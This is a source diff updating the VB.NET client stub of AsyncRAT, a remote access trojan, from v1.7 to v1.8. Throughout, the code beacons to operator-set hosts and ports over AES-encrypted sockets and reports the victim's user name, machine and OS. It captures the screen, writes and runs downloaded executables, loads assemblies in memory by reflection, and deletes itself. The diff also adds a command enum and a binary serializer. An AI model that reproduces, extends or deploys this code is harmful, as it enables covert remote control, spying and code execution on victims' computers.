@@ -18,10 +18,10 @@ Imports System.Threading
 Imports System.Security
 Imports System.Text
 
-#Const VS = True
+#Const Release = False
 #Const INS = False
 
-#If Not VS Then
+#If Release Then
 <Assembly: AssemblyTitle("%Title%")>
 <Assembly: AssemblyDescription("%Description%")>
 <Assembly: AssemblyCompany("%Company%")>
@@ -37,7 +37,7 @@ Imports System.Text
 '
 
 '       │ Author     : NYAN CAT
-'       │ Name       : AsyncRAT
+'       │ Name       : AsyncRAT // Simple Socket
 
 '       Contact Me   : https://github.com/NYAN-x-CAT
 
@@ -46,31 +46,25 @@ Imports System.Text
 '
 
 
-Namespace AsyncRAT_Stub
+Namespace AsyncRAT
 
     Public Class Settings
 
 #If INS Then
         Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%")
-#Else
-        Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Client.exe")
 #End If
 
-#If VS Then
-        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
-        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
-        Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
-#Else
+#If Release Then
         Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
         Public Shared ReadOnly KEY As String = "%KEY%"
-
+#Else
+        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
+        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
+        Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
 #End If
-
-        Public Shared ReadOnly VER As String = "v1.7"
-        Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
+        Public Shared ReadOnly VER As String = "AsyncRAT v1.8"
     End Class
-
 
 
     Public Class Program
@@ -81,7 +75,6 @@ Namespace AsyncRAT_Stub
         Public Shared BufferLengthReceived As Boolean = False
         Public Shared Buffer() As Byte
         Public Shared MS As MemoryStream = Nothing
-        Public Shared ReadOnly SPL = Settings.SPL
         Public Shared Tick As Threading.Timer = Nothing
         Public Shared allDone As New ManualResetEvent(False)
 
@@ -149,12 +142,13 @@ Namespace AsyncRAT_Stub
                 Debug.WriteLine("Connect : Connected")
 
                 isConnected = True
-                Send(Info)
+
+                SendIdentification()
 
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
-                Tick = New Threading.Timer(T, Nothing, 30000, 30000)
+                Tick = New Threading.Timer(T, Nothing, 15000, 30000)
             Catch ex As Exception
                 Debug.WriteLine("Connect : Failed")
                 isConnected = False
@@ -163,14 +157,11 @@ Namespace AsyncRAT_Stub
             End Try
         End Sub
 
-        Private Shared Function Info()
+        Private Shared Sub SendIdentification()
             Dim OS As New Devices.ComputerInfo
-            Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL,
-                                 OS.OSFullName.Replace("Microsoft", Nothing),
-                                 Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
-                                 Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"),
-                                 SPL, Settings.VER)
-        End Function
+            Dim FriendlyName As String = OS.OSFullName.Replace("Microsoft", Nothing) + " " + Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit") + " " + Environment.OSVersion.ServicePack.Replace("Service Pack", "SP")
+            Send(CByte(PacketHeader.identification), GetHash(ID), Environment.UserName, FriendlyName, Settings.VER)
+        End Sub
 
         Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
             If isConnected = False OrElse Not S.Connected Then
@@ -226,11 +217,14 @@ Namespace AsyncRAT_Stub
             End Try
         End Sub
 
-        Public Shared Sub Send(ByVal msg As String)
+        Public Shared Sub Send(ParamArray Msgs As Object())
             If isConnected = True OrElse S.Connected Then
                 Try
+                    Dim Packer As New Pack
+                    Dim Data As Byte() = Packer.Serialize(Msgs)
+
                     Using MS As New MemoryStream
-                        Dim Buffer As Byte() = AES_Encryptor(SB(msg))
+                        Dim Buffer As Byte() = AES_Encryptor(Data)
                         Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
 
                         MS.Write(BufferLength, 0, BufferLength.Length)
@@ -294,7 +288,8 @@ Namespace AsyncRAT_Stub
         Public Shared Sub Ping()
             Try
                 If isConnected = True Then
-                    Send("PING?!")
+                    Send(CByte(PacketHeader.Ping))
+                    Debug.WriteLine("Pinged!")
                 End If
             Catch ex As Exception
             End Try
@@ -302,14 +297,14 @@ Namespace AsyncRAT_Stub
     End Class
 
     Public Class Messages
-        Private Shared ReadOnly SPL = Program.SPL
-
-        Public Shared Sub Read(ByVal b As Byte())
+        Public Shared Sub Read(ByVal Data As Byte())
             Try
-                Dim A As String() = Split(BS(AES_Decryptor(b)), SPL)
-                Select Case A(0)
 
-                    Case "CLOSE"
+                Dim Packer As New Pack
+                Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))
+
+                Select Case itm(0)
+                    Case PacketHeader.ClientShutdown
                         Try
                             Program.S.Shutdown(SocketShutdown.Both)
                             Program.S.Close()
@@ -317,44 +312,46 @@ Namespace AsyncRAT_Stub
                         End Try
                         Environment.Exit(0)
 
-                    Case "DEL"
+                    Case PacketHeader.ClientDelete
                         SelfDelete()
 
-                    Case "UPDATE"
-                        Program.Send("RECEIVED")
-                        Download(".exe", A(1), True)
+                    Case PacketHeader.ClientUpdate
+                        Program.Send(CByte(PacketHeader.MsgReceived))
+                        Download(itm(1), itm(2), itm(3))
 
-                    Case "DW"
-                        Program.Send("RECEIVED")
-                        Download(A(1), A(2))
+                    Case PacketHeader.RemoteDesktopOpen
+                        Program.Send(CByte(PacketHeader.RemoteDesktopOpen))
 
-                    Case "RD-"
-                        Program.Send("RD-")
+                    Case PacketHeader.RemoteDesktopSend
+                        Capture(itm(1), itm(2))
 
-                    Case "RD+"
-                        RemoteDesktop.Capture(A(1), A(2))
-
-                    Case "REFLECTION"
-                        Program.Send("RECEIVED")
-                        Reflection(A(1))
+                    Case PacketHeader.Reflection
+                        Program.Send(CByte(PacketHeader.MsgReceived))
+                        Reflection(itm(1))
 
                 End Select
+
             Catch ex As Exception
-                Program.Send("Msg" + SPL + ex.Message)
+                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
         End Sub
 
-        Private Shared Sub Download(ByVal Name As String, ByVal Data As String, Optional Update As Boolean = False)
+        'Private Shared Function AsyncRatPlugin(ByVal Library As Byte())
+        '    Dim Plugin As Assembly = Assembly.Load(AES_Decryptor(Library))
+        '    Dim CallType = Plugin.CreateInstance("Plugin.Plugin", True)
+        'End Function
+
+        Private Shared Sub Download(ByVal Name As String, ByVal Buffer As Byte(), ByRef Update As Boolean)
             Try
                 Dim Temp As String = Path.GetTempFileName + Name
-                File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
+                File.WriteAllBytes(Temp, AES_Decryptor(Buffer))
                 Thread.Sleep(500)
                 Process.Start(Temp)
                 If Update Then
                     SelfDelete()
                 End If
             Catch ex As Exception
-                Program.Send("Msg" + SPL + ex.Message)
+                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
         End Sub
 
@@ -376,16 +373,15 @@ Namespace AsyncRAT_Stub
                 Process.Start(Del)
                 Environment.Exit(0)
             Catch ex As Exception
-                Program.Send("Msg" + SPL + ex.Message)
+                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
         End Sub
 
         Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
-        Private Shared Sub Reflection(ByVal Str As String) 'gigajew@hf
+        Private Shared Sub Reflection(ByVal buffer As Byte()) 'gigajew@hf
             Try
-                Dim buffer As Byte() = Convert.FromBase64String(StrReverse(Str))
                 Dim parameters As Object() = Nothing
-                Dim assembly As Assembly = Thread.GetDomain().Load(buffer)
+                Dim assembly As Assembly = Thread.GetDomain().Load(AES_Decryptor(buffer))
                 Dim entrypoint As MethodInfo = assembly.EntryPoint
                 If entrypoint.GetParameters().Length > 0 Then
                     parameters = New Object() {New String() {Nothing}}
@@ -409,15 +405,10 @@ Namespace AsyncRAT_Stub
 
                 assemblyExecuteThread.Start()
             Catch ex As Exception
-                Program.Send("Msg" + SPL + ex.Message)
+                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
         End Sub
 
-    End Class
-
-
-
-    Public Class RemoteDesktop
         Public Shared Sync As Object = New Object
         Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
             SyncLock Sync
@@ -444,18 +435,7 @@ Namespace AsyncRAT_Stub
                     Dim MS As New MemoryStream
                     Resize.Save(MS, encoderInfo, encoderParameters)
 
-                    Try
-                        Dim Buffer As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
-                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
-                        Using MEM As New MemoryStream
-                            MEM.Write(BufferLength, 0, BufferLength.Length)
-                            MEM.Write(Buffer, 0, Buffer.Length)
-                            Program.S.Poll(-1, SelectMode.SelectWrite)
-                            Program.S.Send(MEM.ToArray, 0, MEM.Length, SocketFlags.None)
-                        End Using
-                    Catch ex As Exception
-                        Program.isConnected = False
-                    End Try
+                    Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)
 
                     Try
                         MS.Dispose()
@@ -491,26 +471,23 @@ Namespace AsyncRAT_Stub
             Catch ex As Exception
             End Try
         End Function
+
     End Class
 
-
     Module Helper
-
         Function SB(ByVal s As String) As Byte()
-            Return Encoding.Default.GetBytes(s)
+            Return Encoding.UTF8.GetBytes(s)
         End Function
 
         Function BS(ByVal b As Byte()) As String
-            Return Encoding.Default.GetString(b)
+            Return Encoding.UTF8.GetString(b)
         End Function
 
         Function ID() As String
             Dim S As String = Nothing
-
             S += Environment.UserDomainName
             S += Environment.UserName
             S += Environment.MachineName
-
             Return S
         End Function
 
@@ -552,5 +529,153 @@ Namespace AsyncRAT_Stub
             End Try
         End Function
     End Module
+
+
+
+    Enum PacketHeader
+        identification = 0
+        RemoteDesktopOpen = 1
+        RemoteDesktopSend = 2
+        ErrorMassages = 3
+        ClientShutdown = 4
+        ClientDelete = 5
+        ClientUpdate = 6
+        Reflection = 7
+        MsgReceived = 8
+        Ping = 9
+    End Enum
+
+
+    NotInheritable Class Pack
+
+        Private Table As Dictionary(Of Type, Byte)
+        Public Sub New()
+            Table = New Dictionary(Of Type, Byte)()
+
+            Table.Add(GetType(Boolean), 0)
+            Table.Add(GetType(Byte), 1)
+            Table.Add(GetType(Byte()), 2)
+            Table.Add(GetType(Char), 3)
+            Table.Add(GetType(Char()), 4)
+            Table.Add(GetType(Decimal), 5)
+            Table.Add(GetType(Double), 6)
+            Table.Add(GetType(Integer), 7)
+            Table.Add(GetType(Long), 8)
+            Table.Add(GetType(SByte), 9)
+            Table.Add(GetType(Short), 10)
+            Table.Add(GetType(Single), 11)
+            Table.Add(GetType(String), 12)
+            Table.Add(GetType(UInteger), 13)
+            Table.Add(GetType(ULong), 14)
+            Table.Add(GetType(UShort), 15)
+            Table.Add(GetType(DateTime), 16)
+        End Sub
+
+        Public Function Serialize(ParamArray data As Object()) As Byte()
+            Dim Stream As New MemoryStream()
+            Dim Writer As New BinaryWriter(Stream, Encoding.UTF8)
+            Dim Current As Byte = 0
+
+            Writer.Write(Convert.ToByte(data.Length))
+
+            For I As Integer = 0 To data.Length - 1
+                Current = Table(data(I).GetType())
+                Writer.Write(Current)
+
+                Select Case Current
+                    Case 0
+                        Writer.Write(DirectCast(data(I), Boolean))
+                    Case 1
+                        Writer.Write(DirectCast(data(I), Byte))
+                    Case 2
+                        Writer.Write(DirectCast(data(I), Byte()).Length)
+                        Writer.Write(DirectCast(data(I), Byte()))
+                    Case 3
+                        Writer.Write(DirectCast(data(I), Char))
+                    Case 4
+                        Writer.Write(DirectCast(data(I), Char()).ToString())
+                    Case 5
+                        Writer.Write(DirectCast(data(I), Decimal))
+                    Case 6
+                        Writer.Write(DirectCast(data(I), Double))
+                    Case 7
+                        Writer.Write(DirectCast(data(I), Integer))
+                    Case 8
+                        Writer.Write(DirectCast(data(I), Long))
+                    Case 9
+                        Writer.Write(DirectCast(data(I), SByte))
+                    Case 10
+                        Writer.Write(DirectCast(data(I), Short))
+                    Case 11
+                        Writer.Write(DirectCast(data(I), Single))
+                    Case 12
+                        Writer.Write(DirectCast(data(I), String))
+                    Case 13
+                        Writer.Write(DirectCast(data(I), UInteger))
+                    Case 14
+                        Writer.Write(DirectCast(data(I), ULong))
+                    Case 15
+                        Writer.Write(DirectCast(data(I), UShort))
+                    Case 16
+                        Writer.Write(DirectCast(data(I), Date).ToBinary())
+                End Select
+            Next
+
+            Writer.Close()
+            Return Stream.ToArray()
+        End Function
+
+        Public Function Deserialize(data As Byte()) As Object()
+            Dim Stream As New MemoryStream(data)
+            Dim Reader As New BinaryReader(Stream, Encoding.UTF8)
+            Dim Items As New List(Of Object)()
+            Dim Current As Byte = 0
+            Dim Count As Byte = Reader.ReadByte()
+
+            For I As Integer = 0 To Count - 1
+                Current = Reader.ReadByte()
+
+                Select Case Current
+                    Case 0
+                        Items.Add(Reader.ReadBoolean())
+                    Case 1
+                        Items.Add(Reader.ReadByte())
+                    Case 2
+                        Items.Add(Reader.ReadBytes(Reader.ReadInt32()))
+                    Case 3
+                        Items.Add(Reader.ReadChar())
+                    Case 4
+                        Items.Add(Reader.ReadString().ToCharArray())
+                    Case 5
+                        Items.Add(Reader.ReadDecimal())
+                    Case 6
+                        Items.Add(Reader.ReadDouble())
+                    Case 7
+                        Items.Add(Reader.ReadInt32())
+                    Case 8
+                        Items.Add(Reader.ReadInt64())
+                    Case 9
+                        Items.Add(Reader.ReadSByte())
+                    Case 10
+                        Items.Add(Reader.ReadInt16())
+                    Case 11
+                        Items.Add(Reader.ReadSingle())
+                    Case 12
+                        Items.Add(Reader.ReadString())
+                    Case 13
+                        Items.Add(Reader.ReadUInt32())
+                    Case 14
+                        Items.Add(Reader.ReadUInt64())
+                    Case 15
+                        Items.Add(Reader.ReadUInt16())
+                    Case 16
+                        Items.Add(DateTime.FromBinary(Reader.ReadInt64()))
+                End Select
+            Next
+
+            Reader.Close()
+            Return Items.ToArray()
+        End Function
+    End Class
 
 End Namespace
